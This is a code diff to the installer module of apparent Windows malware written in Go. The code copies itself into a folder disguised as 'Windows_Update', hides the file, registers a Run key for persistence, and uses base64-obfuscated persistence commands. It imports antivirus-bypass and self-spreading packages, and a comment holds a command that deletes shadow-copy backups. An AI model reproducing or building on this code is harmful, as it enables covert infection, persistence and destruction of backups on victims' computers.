@@ -1,24 +1,24 @@
 package install
 
 import (
-	"encoding/base64"
 	"os"
 	"../utils"
 	cp "github.com/cleversoap/go-cp"
 	"../avbypass"
+	"../base64"
+	"../spread"
 )
 
 var TARGET_FILE_NAME = utils.TARGET_FILE_NAME
-func Install(tfn string) {
-	TARGET_FILE_NAME = tfn
+func Install() {
 	// Checks if not running in home folder
-	parent := utils.GetParentFolder()
-	if parent != "Windows_Update" && utils.GetExeName() != TARGET_FILE_NAME {
+	parent := spread.GetParentFolder()
+	if parent != "Windows_Update" && spread.GetExeName() != TARGET_FILE_NAME {
 		utils.Run("mkdir %APPDATA%\\Windows_Update")
 		utils.Run("taskkill /IM " + TARGET_FILE_NAME + " /T /f")
 		os.Remove(os.Getenv("APPDATA") + "\\Windows_Update\\" + TARGET_FILE_NAME)
-		err := cp.Copy(GetExeName(), os.Getenv("APPDATA")+"\\Windows_Update\\"+TARGET_FILE_NAME)
-		Spread()
+		err := cp.Copy(spread.GetExeName(), os.Getenv("APPDATA")+"\\Windows_Update\\"+TARGET_FILE_NAME)
+		// TODO: Spread here.
 		if err == nil {
 			utils.Run("attrib +H +S %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
 			utils.Run("start " + os.Getenv("APPDATA") + "\\Windows_Update\\" + TARGET_FILE_NAME)
@@ -29,7 +29,7 @@ func Install(tfn string) {
 	//REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\
 	utils.Run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\" + TARGET_FILE_NAME)
 	//attrib +H +S %APPDATA%\\Windows_Update\\
-	utils.Run(Base64Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==") + TARGET_FILE_NAME)
+	utils.Run(base64.Base64Decode("YXR0cmliICtIICtTICVBUFBEQVRBJVxcV2luZG93c19VcGRhdGVcXA==") + TARGET_FILE_NAME)
 
 	// TODO: Run with admin
 	//Run("vssadmin.exe Delete Shadows /All /Quiet") //admin
@@ -43,7 +43,7 @@ func Uninstall() {
 func PersistenceBat() {
 	//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
 	var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
-	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)
+	DecodedRegAdd := base64.Base64Decode(RegAdd)
 
 	PERSIST, _ := os.Create("PERSIST.bat")
 
